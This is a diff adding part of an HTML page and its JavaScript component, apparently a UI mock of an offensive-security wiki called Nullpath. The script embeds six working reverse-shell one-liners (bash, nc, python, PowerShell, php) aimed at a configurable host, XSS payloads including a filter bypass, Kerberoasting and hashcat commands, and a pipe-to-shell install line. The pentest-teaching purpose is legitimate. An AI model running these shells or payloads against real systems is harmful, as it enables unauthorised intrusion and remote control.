+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Filter bypass</span>
+            <span style="flex: 1;"></span>
+            <span onClick="{{ copyAllPayloads }}" style="padding: 5px 12px; font-size: 11.5px; border: 1px solid oklch(0.34 0.006 80); color: {{ copyAllColor }}; cursor: pointer;" style-hover="border-color: oklch(0.80 0.13 72);">{{ copyAllLabel }}</span>
+          </div>
+
+          <div style="border: 1px solid oklch(0.26 0.006 80);">
+            <div style="display: grid; grid-template-columns: 150px minmax(0, 1fr) 70px; gap: 12px; padding: 9px 16px; background: oklch(0.19 0.006 80); border-bottom: 1px solid oklch(0.26 0.006 80); font-size: 10px; letter-spacing: 0.14em; text-transform: uppercase; color: oklch(0.58 0.008 80);">
+              <span>Context</span><span>Payload</span><span></span>
+            </div>
+            <sc-for list="{{ payloads }}" as="pl" hint-placeholder-count="7">
+              <div style="display: grid; grid-template-columns: 150px minmax(0, 1fr) 70px; gap: 12px; padding: 11px 16px; border-bottom: 1px solid oklch(0.24 0.006 80); align-items: baseline;" style-hover="background: oklch(0.185 0.006 80);">
+                <span style="font-size: 11px; color: oklch(0.76 0.008 80);">{{ pl.ctx }}</span>
+                <code style="font-size: 12.5px; color: oklch(0.88 0.006 80); white-space: pre-wrap; word-break: break-all;">{{ pl.code }}</code>
+                <span onClick="{{ pl.copy }}" style="font-size: 11px; cursor: pointer; color: {{ pl.copyColor }}; text-align: right;" style-hover="color: oklch(0.88 0.13 72);">{{ pl.copyLabel }}</span>
+              </div>
+            </sc-for>
+          </div>
+          <div style="margin-top: 14px; font-size: 11.5px; color: oklch(0.58 0.008 80);">7 of 148 vectors · <span style="color: oklch(0.80 0.13 72); cursor: pointer;">load full list</span></div>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isChangelog }}">
+        <div style="padding: 26px 40px 60px 40px; max-width: 820px;">
+          <div style="display: flex; gap: 8px; font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 22px;">
+            <span onClick="{{ goHome }}" style="cursor: pointer;">Home</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Changelog</span>
+          </div>
+          <div style="margin-bottom: 30px;">
+            <h1 style="font-family: Spectral, Georgia, serif; font-size: 36px; font-weight: 600; letter-spacing: -0.02em; margin: 0 0 12px 0; color: oklch(0.97 0.006 80);">Changelog</h1>
+            <p style="margin: 0; font-size: 14px; color: oklch(0.78 0.008 80); text-wrap: pretty;">Every merged edit across the knowledge base, newest first. Follow the feed to see what got rewritten, added, or corrected.</p>
+          </div>
+
+          <sc-for list="{{ changelog }}" as="day" hint-placeholder-count="4">
+            <div style="display: grid; grid-template-columns: 96px minmax(0, 1fr); gap: 18px; padding: 4px 0 22px 0;">
+              <div style="font-size: 11.5px; color: oklch(0.60 0.008 80); text-align: right; padding-top: 2px; position: sticky; top: 66px; align-self: start;">{{ day.date }}</div>
+              <div style="border-left: 1px solid oklch(0.28 0.006 80); padding-left: 18px;">
+                <sc-for list="{{ day.entries }}" as="e" hint-placeholder-count="3">
+                  <div style="display: flex; gap: 10px; align-items: baseline; padding: 5px 0;">
+                    <span style="min-width: 74px; font-size: 10px; letter-spacing: 0.06em; text-transform: uppercase; padding: 1px 0; color: {{ e.color }};">{{ e.kind }}</span>
+                    <span onClick="{{ e.open }}" style="flex: 1; color: oklch(0.90 0.006 80); cursor: pointer;" style-hover="color: oklch(0.88 0.13 72);">{{ e.title }}</span>
+                    <span style="font-size: 11px; color: oklch(0.56 0.008 80);">{{ e.by }}</span>
+                  </div>
+                </sc-for>
+              </div>
+            </div>
+          </sc-for>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isContribute }}">
+        <div style="padding: 26px 40px 60px 40px;">
+          <div style="display: flex; gap: 8px; font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 22px;">
+            <span onClick="{{ goHome }}" style="cursor: pointer;">Home</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Contribute</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Edit page</span>
+          </div>
+          <div style="display: grid; grid-template-columns: minmax(0, 1fr) 260px; gap: 34px; align-items: start;">
+            <div style="min-width: 0; max-width: 820px;">
+              <h1 style="font-family: Spectral, Georgia, serif; font-size: 34px; font-weight: 600; letter-spacing: -0.02em; margin: 0 0 10px 0; color: oklch(0.97 0.006 80);">Editing: Kerberoasting</h1>
+              <p style="margin: 0 0 22px 0; font-size: 13.5px; color: oklch(0.76 0.008 80); text-wrap: pretty;">Pages are plain Markdown with fenced code blocks. Your edit opens a pull request; a maintainer reviews the diff before it goes live.</p>
+
+              <div style="display: flex; gap: 6px; margin-bottom: -1px;">
+                <span style="padding: 7px 14px; font-size: 12px; border: 1px solid oklch(0.30 0.006 80); border-bottom: 1px solid oklch(0.155 0.006 80); background: oklch(0.175 0.006 80); color: oklch(0.92 0.006 80);">Write</span>
+                <span style="padding: 7px 14px; font-size: 12px; border: 1px solid transparent; color: oklch(0.62 0.008 80); cursor: pointer;">Preview</span>
+              </div>
+              <textarea value="{{ draft }}" onInput="{{ setDraft }}" style="width: 100%; min-height: 300px; resize: vertical; background: oklch(0.135 0.006 80); border: 1px solid oklch(0.30 0.006 80); color: oklch(0.90 0.006 80); font-family: 'IBM Plex Mono', monospace; font-size: 13px; line-height: 1.7; padding: 14px; border-radius: 0 3px 3px 3px;" style-focus="border-color: oklch(0.80 0.13 72);"></textarea>
+
+              <div style="margin-top: 14px;">
+                <div style="font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; color: oklch(0.58 0.008 80); margin-bottom: 6px;">Commit summary</div>
+                <input value="{{ summary }}" onInput="{{ setSummary }}" placeholder="describe your change" style="width: 100%; background: oklch(0.135 0.006 80); border: 1px solid oklch(0.30 0.006 80); color: oklch(0.92 0.006 80); font-family: 'IBM Plex Mono', monospace; font-size: 13px; padding: 9px 12px; border-radius: 3px;" style-focus="border-color: oklch(0.80 0.13 72);" />
+              </div>
+              <div style="display: flex; gap: 10px; margin-top: 16px; align-items: center;">
+                <span style="padding: 9px 18px; background: oklch(0.80 0.13 72); color: oklch(0.16 0.03 72); font-weight: 600; font-size: 12.5px; border-radius: 3px; cursor: pointer;">Propose changes</span>
+                <span onClick="{{ goArticle }}" style="padding: 9px 16px; border: 1px solid oklch(0.32 0.006 80); color: oklch(0.86 0.006 80); font-size: 12.5px; border-radius: 3px; cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Cancel</span>
+                <span style="flex: 1;"></span>
+                <span style="font-size: 11.5px; color: oklch(0.58 0.008 80);">{{ draftLen }} chars</span>
+              </div>
+            </div>
+
+            <aside style="border: 1px solid oklch(0.26 0.006 80); padding: 16px 18px;">
+              <div style="font-size: 9.5px; letter-spacing: 0.16em; text-transform: uppercase; color: oklch(0.56 0.008 80); margin-bottom: 12px;">House style</div>
+              <div style="display: flex; flex-direction: column; gap: 11px; font-size: 12.5px; color: oklch(0.78 0.008 80);">
+                <div><span style="color: oklch(0.88 0.13 72);">Commands first.</span> Lead each section with the exact command, then explain.</div>
+                <div><span style="color: oklch(0.88 0.13 72);">Show the footprint.</span> Every offensive page needs a detection section.</div>
+                <div><span style="color: oklch(0.88 0.13 72);">Tag the access.</span> State the prerequisites in the tag row.</div>
+                <div><span style="color: oklch(0.88 0.13 72);">No stolen data.</span> Redact real hosts, creds and client names.</div>
+              </div>
+              <div style="margin-top: 16px; padding-top: 14px; border-top: 1px solid oklch(0.26 0.006 80); font-size: 11.5px; color: oklch(0.60 0.008 80);">Read the full <span style="color: oklch(0.80 0.13 72); cursor: pointer;">style guide ↗</span></div>
+            </aside>
+          </div>
+        </div>
+      </sc-if>
+
+    </main>
+  </div>
+</div>
+</x-dc>
+<script type="text/x-dc" data-dc-script data-props="{&quot;$preview&quot;:{&quot;width&quot;:&quot;100%&quot;,&quot;height&quot;:760}}">
+class Component extends DCLogic {
+  state = {
+    view: 'home',
+    copy1: false, copy2: false,
+    lhost: '10.10.14.7', lport: '4444',
+    shellCopied: -1,
+    query: 'kerberos',
+    payloadCopied: -1, copyAll: false,
+    draft: "## How it works\n\nAny authenticated domain user can request a service ticket for any\naccount with a registered SPN...\n\n```bash\nGetUserSPNs.py -request -dc-ip 10.10.10.5 corp.local/jdoe:'Passw0rd!'\n```",
+    summary: '',
+    section: 'web',
+    isNarrow: false, sidebarOpen: false,
+    webOpen: true, adOpen: true,
+    paletteOpen: false, paletteQuery: '',
+    readProgress: 0,
+  };
+
+  componentDidMount() {
+    this._onResize = () => this.setState({ isNarrow: window.innerWidth < 900 });
+    this._onScroll = () => {
+      const el = document.scrollingElement || document.documentElement;
+      const max = el.scrollHeight - el.clientHeight;
+      this.setState({ readProgress: max > 0 ? Math.min(100, (el.scrollTop / max) * 100) : 0 });
+    };
+    this._onKey = (e) => {
+      const tag = (e.target && e.target.tagName) || '';
+      const typing = tag === 'INPUT' || tag === 'TEXTAREA';
+      if (e.key === '/' && !typing && !this.state.paletteOpen) { e.preventDefault(); this.setState({ paletteOpen: true, paletteQuery: '' }); }
+      else if (e.key === 'Escape') { this.setState({ paletteOpen: false, sidebarOpen: false }); }
+    };
+    window.addEventListener('resize', this._onResize);
+    window.addEventListener('scroll', this._onScroll, { passive: true });
+    window.addEventListener('keydown', this._onKey);
+    this._onResize();
+  }
+  componentWillUnmount() {
+    window.removeEventListener('resize', this._onResize);
+    window.removeEventListener('scroll', this._onScroll);
+    window.removeEventListener('keydown', this._onKey);
+  }
+
+  go(view) { this.setState({ view, sidebarOpen: false, paletteOpen: false, readProgress: 0 }); if (typeof window !== 'undefined') window.scrollTo(0, 0); }
+  goSectionNamed(section) { this.setState({ section }); this.go('section'); }
+
+  copyText(text, key) {
+    try { navigator.clipboard && navigator.clipboard.writeText(text); } catch (e) {}
+    this.setState({ [key]: true });
+    setTimeout(() => this.setState({ [key]: false }), 1400);
+  }
+
+  navColor(v) { return this.state.view === v ? 'oklch(0.88 0.13 72)' : 'oklch(0.72 0.008 80)'; }
+
+  buildShells() {
+    const h = this.state.lhost || 'LHOST';
+    const p = this.state.lport || 'LPORT';
+    const defs = [
+      { name: 'bash · /dev/tcp', cmd: `bash -i >& /dev/tcp/${h}/${p} 0>&1` },
+      { name: 'sh · mkfifo', cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${h} ${p} >/tmp/f` },
+      { name: 'python3', cmd: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'` },
+      { name: 'nc · -e', cmd: `nc -e /bin/bash ${h} ${p}` },
+      { name: 'powershell', cmd: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${h}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"` },
+      { name: 'php', cmd: `php -r '$s=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
+    ];
+    return defs.map((d, i) => ({
+      name: d.name,
+      cmd: d.cmd,
+      copyLabel: this.state.shellCopied === i ? 'copied ✓' : 'copy',
+      copyColor: this.state.shellCopied === i ? 'oklch(0.82 0.10 150)' : 'oklch(0.60 0.008 80)',
+      copy: () => {
+        try { navigator.clipboard && navigator.clipboard.writeText(d.cmd); } catch (e) {}
+        this.setState({ shellCopied: i });
+        setTimeout(() => { if (this.state.shellCopied === i) this.setState({ shellCopied: -1 }); }, 1400);
+      },
+    }));
+  }
+
+  buildResults() {
+    const q = (this.state.query || '').toLowerCase();
+    const all = [
+      { title: 'Kerberoasting', path: 'Active Directory / Kerberos', level: 'intermediate', snippet: 'Request TGS tickets for SPN accounts and crack the service-account hash offline.', view: 'article' },
+      { title: 'AS-REP Roasting', path: 'Active Directory / Kerberos', level: 'intermediate', snippet: 'Accounts without Kerberos preauth hand you a crackable AS-REP with no auth.', view: 'article' },
+      { title: 'Golden & Silver tickets', path: 'Active Directory / Kerberos', level: 'advanced', snippet: 'Forge TGT / TGS from the krbtgt or a service hash for durable domain access.', view: 'article' },
+      { title: 'SQL Injection — methodology', path: 'Web Pentesting / SQLi', level: 'core', snippet: 'Detect, fingerprint, extract across MySQL, PostgreSQL, MSSQL and Oracle.', view: 'section' },
+      { title: 'Reverse shell one-liners', path: 'Cheatsheets', level: 'reference', snippet: 'bash, python, powershell, php and nc payloads with live LHOST / LPORT.', view: 'cheat' },
+    ];
+    const levelColor = (l) => (l === 'advanced' ? 'oklch(0.76 0.008 80)' : l === 'reference' ? 'oklch(0.62 0.008 80)' : 'oklch(0.80 0.13 72)');
+    const filtered = q ? all.filter(r => (r.title + r.snippet + r.path + r.level).toLowerCase().includes(q)) : all;
+    return { list: filtered.map(r => ({ ...r, levelColor: levelColor(r.level), open: () => this.go(r.view) })), count: filtered.length };
+  }
+
+  buildPayloads() {
+    const S = '<' + 'script>', SE = '</' + 'script>';
+    const defs = [
+      { ctx: 'HTML body', code: S + 'alert(document.domain)' + SE },
+      { ctx: 'HTML body', code: '<img src=x onerror=alert(1)>' },
+      { ctx: 'Attribute', code: '" autofocus onfocus=alert(1) x="' },
+      { ctx: 'JS string', code: "';alert(1);//" },
+      { ctx: 'SVG', code: '<svg/onload=alert(1)>' },
+      { ctx: 'Filter bypass', code: '<img src=x onerror="&#97;lert(1)">' },
+      { ctx: 'Markdown', code: '[click](javascript:alert(1))' },
+    ];
+    return defs.map((d, i) => ({
+      ctx: d.ctx, code: d.code,
+      copyLabel: this.state.payloadCopied === i ? 'copied' : 'copy',
+      copyColor: this.state.payloadCopied === i ? 'oklch(0.82 0.10 150)' : 'oklch(0.60 0.008 80)',
+      copy: () => {
+        try { navigator.clipboard && navigator.clipboard.writeText(d.code); } catch (e) {}
+        this.setState({ payloadCopied: i });
+        setTimeout(() => { if (this.state.payloadCopied === i) this.setState({ payloadCopied: -1 }); }, 1400);
+      },
+    }));
+  }
+
+  buildChangelog() {
+    const kindColor = (k) => (k === 'new' ? 'oklch(0.82 0.10 150)' : k === 'rewrite' ? 'oklch(0.80 0.13 72)' : k === 'fix' ? 'oklch(0.74 0.15 30)' : 'oklch(0.60 0.008 80)');
+    const days = [
+      { date: '04 Sep 2026', entries: [
+        { kind: 'rewrite', title: 'Kerberoasting', by: 'jdoe', view: 'article' },
+        { kind: 'edit', title: 'AS-REP Roasting — RC4 note', by: 'aviv', view: 'article' },
+      ]},
+      { date: '03 Sep 2026', entries: [
+        { kind: 'new', title: 'SQLi · MySQL WAF bypass (+9 payloads)', by: 'm0nk', view: 'section' },
+        { kind: 'fix', title: 'ffuf recursion flag corrected', by: 'nyx', view: 'section' },
+      ]},
+      { date: '02 Sep 2026', entries: [
+        { kind: 'new', title: 'IMDSv2 SSRF pivots', by: 'aviv', view: 'section' },
+        { kind: 'edit', title: 'Reverse shell — added php variant', by: 'jdoe', view: 'cheat' },
+      ]},
+      { date: '31 Aug 2026', entries: [
+        { kind: 'edit', title: 'Linux capabilities privesc', by: 'root0', view: 'article' },
+        { kind: 'fix', title: 'XSS SVG payload escaping', by: 'nyx', view: 'payloads' },
+      ]},
+    ];
+    return days.map(d => ({
+      date: d.date,
+      entries: d.entries.map(e => ({ ...e, color: kindColor(e.kind), open: () => this.go(e.view) })),
+    }));
+  }
+
+  buildTools() {
+    const defs = [
+      { name: 'nmap', cat: 'recon', desc: 'Port and service discovery, scriptable with NSE.', install: 'apt install nmap', pages: 41, view: 'section' },
+      { name: 'ffuf', cat: 'web', desc: 'Fast content and vhost fuzzing.', install: 'go install github.com/ffuf/ffuf/v2@latest', pages: 33, view: 'section' },
+      { name: 'sqlmap', cat: 'web', desc: 'Automated SQL injection detection and exploitation.', install: 'pipx install sqlmap', pages: 18, view: 'section' },
+      { name: 'BloodHound', cat: 'AD', desc: 'Graph attack paths across an AD environment.', install: 'pipx install bloodhound-ce', pages: 27, view: 'article' },
+      { name: 'impacket', cat: 'AD', desc: 'Python toolkit for Windows network protocols.', install: 'pipx install impacket', pages: 46, view: 'article' },
+      { name: 'Rubeus', cat: 'AD', desc: 'On-host Kerberos abuse for Windows.', install: 'Rubeus.exe (compile from source)', pages: 19, view: 'article' },
+      { name: 'hashcat', cat: 'crack', desc: 'GPU password and hash cracking.', install: 'apt install hashcat', pages: 24, view: 'article' },
+      { name: 'linpeas', cat: 'privesc', desc: 'Linux privilege-escalation enumeration.', install: 'curl -L linpeas.sh | sh', pages: 22, view: 'section' },
+    ];
+    return defs.map(d => ({ ...d, open: () => this.go(d.view) }));
+  }
+
+  buildSection() {
+    const A = 'oklch(0.80 0.13 72)', ADV = 'oklch(0.76 0.008 80)', MID = 'oklch(0.76 0.008 80)';
+    const sections = {
+      web: {
+        title: 'Web Pentesting', count: 124,
+        desc: '124 pages covering everything reachable over HTTP. Start with the methodology page if you are working a new target; jump straight to a class if you already know what you are looking at.',
+        rows: [
+          { title: 'SQL Injection — methodology', blurb: 'Detect, fingerprint, extract. Covers all four DBMS families.', level: 'core', lc: A, tag: 'injection', date: '03 Sep', view: 'article' },
+          { title: 'SSRF and metadata pivots', blurb: 'Reaching internal services, cloud metadata, and gopher chains.', level: 'intermediate', lc: MID, tag: 'server-side', date: '02 Sep', view: 'ssrf' },
+          { title: 'File upload to RCE', blurb: 'Extension, MIME and magic-byte tricks per web server.', level: 'intermediate', lc: MID, tag: 'server-side', date: '21 Aug', view: 'article' },
+          { title: 'IDOR and broken object access', blurb: 'Finding the identifier, then proving impact cleanly.', level: 'beginner', lc: A, tag: 'access control', date: '19 Aug', view: 'article' },
+          { title: 'Java deserialization', blurb: 'Gadget selection with ysoserial and detection of sinks.', level: 'advanced', lc: ADV, tag: 'server-side', date: '12 Aug', view: 'notfound' },
+        ],
+      },
+      ad: {
+        title: 'Active Directory', count: 98,
+        desc: '98 pages on owning a Windows domain — from first authenticated foothold through Kerberos abuse, delegation, ACL paths and durable persistence.',
+        rows: [
+          { title: 'Kerberoasting', blurb: 'Roast SPN accounts and crack the service hash offline.', level: 'intermediate', lc: MID, tag: 'kerberos', date: '04 Sep', view: 'article' },
+          { title: 'AS-REP Roasting', blurb: 'Accounts without preauth hand you a crackable AS-REP.', level: 'intermediate', lc: MID, tag: 'kerberos', date: '04 Sep', view: 'article' },
+          { title: 'Unconstrained delegation', blurb: 'Coerce a DC and capture its TGT from a delegating host.', level: 'advanced', lc: ADV, tag: 'delegation', date: '29 Aug', view: 'article' },
+          { title: 'Golden & Silver tickets', blurb: 'Forge TGT/TGS from krbtgt or a service hash.', level: 'advanced', lc: ADV, tag: 'persistence', date: '24 Aug', view: 'article' },
+          { title: 'ACL abuse with BloodHound', blurb: 'Walk GenericAll / WriteDACL edges to Domain Admin.', level: 'intermediate', lc: MID, tag: 'acl', date: '18 Aug', view: 'article' },
+        ],
+      },
+      cloud: {
+        title: 'Cloud & Container', count: 54,
+        desc: '54 pages on cloud and container attack paths: IAM privilege chains, metadata abuse, storage exposure, and breaking out of Kubernetes.',
+        rows: [
+          { title: 'IMDSv2 SSRF pivots', blurb: 'Reaching the metadata service through an SSRF primitive.', level: 'intermediate', lc: MID, tag: 'aws', date: '02 Sep', view: 'ssrf' },
+          { title: 'S3 bucket enumeration', blurb: 'Finding, listing and abusing misconfigured buckets.', level: 'beginner', lc: A, tag: 'aws', date: '27 Aug', view: 'article' },
+          { title: 'IAM privilege escalation', blurb: 'The 20-odd policy misconfigs that let a role escalate.', level: 'advanced', lc: ADV, tag: 'iam', date: '22 Aug', view: 'article' },
+          { title: 'Kubernetes RBAC breakout', blurb: 'Service-account tokens to node and cluster compromise.', level: 'advanced', lc: ADV, tag: 'k8s', date: '15 Aug', view: 'article' },
+        ],
+      },
+      recon: {
+        title: 'Network & Recon', count: 81,
+        desc: '81 pages on mapping a target before you touch it: port and service discovery, subdomain and DNS work, and open-source intelligence.',
+        rows: [
+          { title: 'nmap methodology', blurb: 'Staged scanning from discovery to scripted enumeration.', level: 'core', lc: A, tag: 'scanning', date: '01 Sep', view: 'article' },
+          { title: 'Subdomain enumeration', blurb: 'Passive sources, brute force, and permutation with amass.', level: 'beginner', lc: A, tag: 'dns', date: '26 Aug', view: 'article' },
+          { title: 'Content discovery with ffuf', blurb: 'Wordlists, recursion, filtering and vhost fuzzing.', level: 'beginner', lc: A, tag: 'web', date: '20 Aug', view: 'article' },
+          { title: 'SMB & RPC enumeration', blurb: 'Null sessions, share hunting and user extraction.', level: 'intermediate', lc: MID, tag: 'windows', date: '14 Aug', view: 'article' },
+        ],
+      },
+    };
+    const s = sections[this.state.section] || sections.web;
+    return { ...s, rows: s.rows.map(r => ({ ...r, open: () => this.go(r.view) })) };
+  }
+
+  buildPalette() {
+    const q = (this.state.paletteQuery || '').toLowerCase();
+    const idx = [
+      { title: 'Kerberoasting', hint: 'Active Directory / Kerberos', view: 'article' },
+      { title: 'AS-REP Roasting', hint: 'Active Directory / Kerberos', view: 'article' },
+      { title: 'SSRF and metadata pivots', hint: 'Web Pentesting / Server-side', view: 'ssrf' },
+      { title: 'SQL Injection', hint: 'Web Pentesting / Injection', view: 'section' },
+      { title: 'Reverse shell one-liners', hint: 'Cheatsheet', view: 'cheat' },
+      { title: 'XSS payload library', hint: 'Payloads', view: 'payloads' },
+      { title: 'Tool arsenal', hint: 'Reference', view: 'tools' },
+      { title: 'Active Directory', hint: 'Section index', view: 'section', section: 'ad' },
+      { title: 'Cloud & Container', hint: 'Section index', view: 'section', section: 'cloud' },
+      { title: 'Network & Recon', hint: 'Section index', view: 'section', section: 'recon' },
+      { title: 'Changelog', hint: 'Meta', view: 'changelog' },
+      { title: 'Style guide', hint: 'Meta', view: 'styleguide' },
+      { title: 'Contributor leaderboard', hint: 'Meta', view: 'leaderboard' },
+      { title: 'About Nullpath', hint: 'Meta', view: 'about' },
+    ];
+    const filtered = q ? idx.filter(i => (i.title + i.hint).toLowerCase().includes(q)) : idx;
+    return filtered.slice(0, 8).map(i => ({
+      title: i.title, hint: i.hint,
+      open: () => { if (i.section) this.goSectionNamed(i.section); else this.go(i.view); },
+    }));
+  }
+
+  buildLeaderboard() {
+    const defs = [
+      { rank: 1, name: 'nyx', role: 'Web & recon', edits: 268, pages: 44, hue: 320 },
+      { rank: 2, name: 'aviv', role: 'Cloud & container', edits: 214, pages: 37, hue: 200 },
+      { rank: 3, name: 'm0nk', role: 'Injection & payloads', edits: 176, pages: 31, hue: 150 },
+      { rank: 4, name: 'jdoe', role: 'Active Directory', edits: 142, pages: 28, hue: 72, me: true },
+      { rank: 5, name: 'root0', role: 'Linux privesc', edits: 118, pages: 22, hue: 40 },
+      { rank: 6, name: 'sable', role: 'Mobile & blue team', edits: 91, pages: 19, hue: 260 },
+    ];
+    return defs.map(d => ({ ...d, avatar: 'oklch(0.40 0.09 ' + d.hue + ')', open: () => this.go('profile') }));
+  }
+
+  renderVals() {
+    const res = this.buildResults();
+    const sec = this.buildSection();
+    return {
+      asideExtra: this.state.isNarrow
+        ? 'position: fixed; left: 0; top: 54px; bottom: 0; width: 260px; max-height: none; z-index: 40; transform: translateX(' + (this.state.sidebarOpen ? '0' : '-105%') + '); transition: transform 0.22s ease; box-shadow: 8px 0 30px rgba(0,0,0,0.45);'
+        : '',
+      gridCols: this.state.isNarrow ? '1fr' : '262px minmax(0, 1fr)',
+      isNarrow: this.state.isNarrow,
+      sidebarOpen: this.state.sidebarOpen,
+      showBackdrop: this.state.isNarrow && this.state.sidebarOpen,
+      toggleSidebar: () => this.setState(s => ({ sidebarOpen: !s.sidebarOpen })),
+      closeSidebar: () => this.setState({ sidebarOpen: false }),
+      webOpen: this.state.webOpen,
+      adOpen: this.state.adOpen,
+      toggleWeb: () => this.setState(s => ({ webOpen: !s.webOpen })),
+      toggleAd: () => this.setState(s => ({ adOpen: !s.adOpen })),
+      webCaret: this.state.webOpen ? '▾' : '▸',
+      adCaret: this.state.adOpen ? '▾' : '▸',
+
+      paletteOpen: this.state.paletteOpen,
+      openPalette: () => this.setState({ paletteOpen: true, paletteQuery: '' }),
+      closePalette: () => this.setState({ paletteOpen: false }),
+      paletteQuery: this.state.paletteQuery,
+      setPaletteQuery: (e) => this.setState({ paletteQuery: e.target.value }),
+      paletteResults: this.buildPalette(),
+
+      readProgress: this.state.readProgress + '%',
+
+      sectionTitle: sec.title, sectionDesc: sec.desc, sectionCount: sec.count, sectionRows: sec.rows,
+      goWeb: () => this.goSectionNamed('web'),
+      goAd: () => this.goSectionNamed('ad'),
+      goCloud: () => this.goSectionNamed('cloud'),
+      goRecon: () => this.goSectionNamed('recon'),
+
+      isSsrf: this.state.view === 'ssrf',
+      isStyleGuide: this.state.view === 'styleguide',
+      isAbout: this.state.view === 'about',
+      isLeaderboard: this.state.view === 'leaderboard',
+      goSsrf: () => this.go('ssrf'),
+      goStyleGuide: () => this.go('styleguide'),
+      goAbout: () => this.go('about'),
+      goLeaderboard: () => this.go('leaderboard'),
+      leaders: this.buildLeaderboard(),
+      isHome: this.state.view === 'home',
+      isSection: this.state.view === 'section',
+      isArticle: this.state.view === 'article',
+      isCheat: this.state.view === 'cheat',
+      isSearch: this.state.view === 'search',
+      isPayloads: this.state.view === 'payloads',
+      isChangelog: this.state.view === 'changelog',
+      isContribute: this.state.view === 'contribute',
+      isTools: this.state.view === 'tools',
+      isProfile: this.state.view === 'profile',
+      isNotFound: this.state.view === 'notfound',
+      goTools: () => this.go('tools'),
+      goProfile: () => this.go('profile'),
+      goNotFound: () => this.go('notfound'),
+      tools: this.buildTools(),
+      goHome: () => this.go('home'),
+      goSection: () => this.go('section'),
+      goArticle: () => this.go('article'),
+      goCheat: () => this.go('cheat'),
+      goSearch: () => this.go('search'),
+      goPayloads: () => this.go('payloads'),
+      goChangelog: () => this.go('changelog'),
+      goContribute: () => this.go('contribute'),
+      homeColor: this.navColor('home'),
+      sectionColor: this.navColor('section'),
+      articleColor: this.navColor('article'),
+      cheatColor: this.navColor('cheat'),
+      searchColor: this.navColor('search'),
+
+      copy1: () => this.copyText("GetUserSPNs.py -request -dc-ip 10.10.10.5 corp.local/jdoe:'Passw0rd!' -outputfile roast.txt", 'copy1'),
+      copy2: () => this.copyText('hashcat -m 13100 -a 0 roast.txt rockyou.txt -r rules/best64.rule -O', 'copy2'),
+      copy1Label: this.state.copy1 ? 'copied ✓' : 'copy',
+      copy2Label: this.state.copy2 ? 'copied ✓' : 'copy',
+      copy1Color: this.state.copy1 ? 'oklch(0.82 0.10 150)' : 'oklch(0.60 0.008 80)',
+      copy2Color: this.state.copy2 ? 'oklch(0.82 0.10 150)' : 'oklch(0.60 0.008 80)',
+
+      lhost: this.state.lhost,
+      lport: this.state.lport,
+      setLhost: (e) => this.setState({ lhost: e.target.value }),
+      setLport: (e) => this.setState({ lport: e.target.value }),
+      shells: this.buildShells(),
+
+      query: this.state.query,
+      setQuery: (e) => this.setState({ query: e.target.value }),
+      results: res.list,
+      resultCount: res.count,
+
+      payloads: this.buildPayloads(),
+      copyAllLabel: this.state.copyAll ? 'copied all ✓' : 'copy all',
+      copyAllColor: this.state.copyAll ? 'oklch(0.82 0.10 150)' : 'oklch(0.86 0.006 80)',
+      copyAllPayloads: () => {
+        const text = this.buildPayloads().map(p => p.code).join('\n');
+        try { navigator.clipboard && navigator.clipboard.writeText(text); } catch (e) {}
+        this.setState({ copyAll: true });
+        setTimeout(() => this.setState({ copyAll: false }), 1400);
+      },
+
+      changelog: this.buildChangelog(),
+
+      draft: this.state.draft,
+      setDraft: (e) => this.setState({ draft: e.target.value }),
+      draftLen: (this.state.draft || '').length,
+      summary: this.state.summary,
+      setSummary: (e) => this.setState({ summary: e.target.value }),
+    };
+  }
+}
+</script>
+</body>
+</html>
